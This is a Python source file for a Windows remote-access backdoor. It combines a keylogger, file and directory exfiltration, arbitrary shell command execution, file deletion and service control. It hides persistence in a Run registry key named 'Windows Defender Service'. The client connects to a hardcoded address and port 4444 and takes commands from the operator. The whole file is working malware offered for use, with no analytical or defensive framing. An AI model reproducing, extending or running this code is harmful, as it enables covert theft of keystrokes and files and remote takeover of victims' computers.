import os
import shutil
import socket
import threading
import winreg as reg
import pynput.keyboard
import base64
import subprocess

# Keylogger Class
class Keylogger:
    def __init__(self):
        self.log = ""
        self.connection = None

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            self.append_to_log(str(key.char))
        except AttributeError:
            if key == key.space:
                self.append_to_log(" ")
            else:
                self.append_to_log(f" {str(key)} ")

    def report(self):
        if self.connection:
            try:
                self.send_log(self.log)
                self.log = ""
            except Exception as e:
                print(f"Failed to send log: {e}")
        timer = threading.Timer(60, self.report)
        timer.start()

    def start(self):
        print("Starting keylogger...")
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def send_log(self, log):
        try:
            if self.connection:
                self.connection.send(log.encode())
        except Exception as e:
            print(f"Failed to send log: {e}")

# File Exfiltration Class
class FileExfiltration:
    def __init__(self, connection):
        self.connection = connection

    def retrieve_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                self.connection.send(file.read())
        except Exception as e:
            self.connection.send(f"Failed to retrieve file: {e}".encode())

    def retrieve_directory(self, dir_path):
        try:
            shutil.make_archive('archive', 'zip', dir_path)
            with open('archive.zip', 'rb') as file:
                self.connection.send(file.read())
            os.remove('archive.zip')
        except Exception as e:
            self.connection.send(f"Failed to retrieve directory: {e}".encode())

    def retrieve_specific_files(self, dir_path, file_extension):
        try:
            for root, _, files in os.walk(dir_path):
                for file in files:
                    if file.endswith(file_extension):
                        self.retrieve_file(os.path.join(root, file))
        except Exception as e:
            self.connection.send(f"Failed to retrieve specific files: {e}".encode())

# Client Backdoor Class
class Client:
    def __init__(self, connection):
        self.connection = connection
        self.keylogger = Keylogger()
        self.file_exfiltration = FileExfiltration(connection)
        self.keylogger.connection = connection  # Link keylogger to the connection

    def start_keylogger(self):
        keylogger_thread = threading.Thread(target=self.keylogger.start)
        keylogger_thread.start()

    def add_to_startup(self, file_path):
        try:
            key = reg.HKEY_CURRENT_USER
            key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open_key, "Windows Defender Service", 0, reg.REG_SZ, file_path)
            reg.CloseKey(open_key)
        except Exception as e:
            self.connection.send(f"Failed to add to startup: {e}".encode())

    def retrieve_file(self, file_path):
        self.file_exfiltration.retrieve_file(file_path)

    def retrieve_directory(self, dir_path):
        self.file_exfiltration.retrieve_directory(dir_path)

    def retrieve_specific_files(self, dir_path, file_extension):
        self.file_exfiltration.retrieve_specific_files(dir_path, file_extension)

    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True)
            self.connection.send(output)
        except subprocess.CalledProcessError as e:
            self.connection.send(f"Command failed: {e}".encode())

    def list_files(self, dir_path):
        try:
            files = os.listdir(dir_path)
            self.connection.send('\n'.join(files).encode())
        except Exception as e:
            self.connection.send(f"Failed to list files: {e}".encode())

    def change_wallpaper(self, file_path):
        try:
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
            self.connection.send("Wallpaper changed.".encode())
        except Exception as e:
            self.connection.send(f"Failed to change wallpaper: {e}".encode())

    def create_file(self, file_path, content):
        try:
            with open(file_path, 'w') as file:
                file.write(content)
            self.connection.send("File created.".encode())
        except Exception as e:
            self.connection.send(f"Failed to create file: {e}".encode())

    def delete_file(self, file_path):
        try:
            os.remove(file_path)
            self.connection.send("File deleted.".encode())
        except Exception as e:
            self.connection.send(f"Failed to delete file: {e}".encode())

    def start_service(self, service_name):
        try:
            os.system(f"net start {service_name}")
            self.connection.send(f"Service {service_name} started.".encode())
        except Exception as e:
            self.connection.send(f"Failed to start service: {e}".encode())

    def stop_service(self, service_name):
        try:
            os.system(f"net stop {service_name}")
            self.connection.send(f"Service {service_name} stopped.".encode())
        except Exception as e:
            self.connection.send(f"Failed to stop service: {e}".encode())

    def control_keylogger(self, action):
        if action == "start":
            self.start_keylogger()
            self.connection.send("Keylogger started.".encode())
        elif action == "stop":
            # Implement keylogger stopping mechanism if needed
            self.connection.send("Keylogger stopped (not implemented).".encode())
        else:
            self.connection.send("Invalid keylogger action.".encode())

# Main Backdoor Logic
def main():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect(("192.168.1.158", 4444))  # Replace with reapers IP and port

    client = Client(connection)

    # Add to startup
    client.add_to_startup(os.path.realpath(__file__))

    # Start keylogger
    client.start_keylogger()

    # Listener for incoming commands
    while True:
        command = connection.recv(1024).decode()

        if command.startswith("download_file"):
            _, file_path = command.split("*", 1)
            client.retrieve_file(file_path)

        elif command.startswith("download_dir"):
            _, dir_path = command.split("*", 1)
            client.retrieve_directory(dir_path)

        elif command.startswith("download_files"):
            _, dir_path, file_extension = command.split("*", 2)
            client.retrieve_specific_files(dir_path, file_extension)

        elif command.startswith("execute"):
            _, cmd = command.split("*", 1)
            client.execute_command(cmd)

        elif command.startswith("list_files"):
            _, dir_path = command.split("*", 1)
            client.list_files(dir_path)

        elif command.startswith("change_wallpaper"):
            _, file_path = command.split("*", 1)
            client.change_wallpaper(file_path)

        elif command.startswith("create_file"):
            _, file_path, content = command.split("*", 2)
            client.create_file(file_path, content)

        elif command.startswith("delete_file"):
            _, file_path = command.split("*", 1)
            client.delete_file(file_path)

        elif command.startswith("start_service"):
            _, service_name = command.split("*", 1)
            client.start_service(service_name)

        elif command.startswith("stop_service"):
            _, service_name = command.split("*", 1)
            client.stop_service(service_name)

        elif command.startswith("keylogger"):
            _, action = command.split("*", 1)
            client.control_keylogger(action)

        elif command == "exit":
            break

    connection.close()

if __name__ == "__main__":
    main()
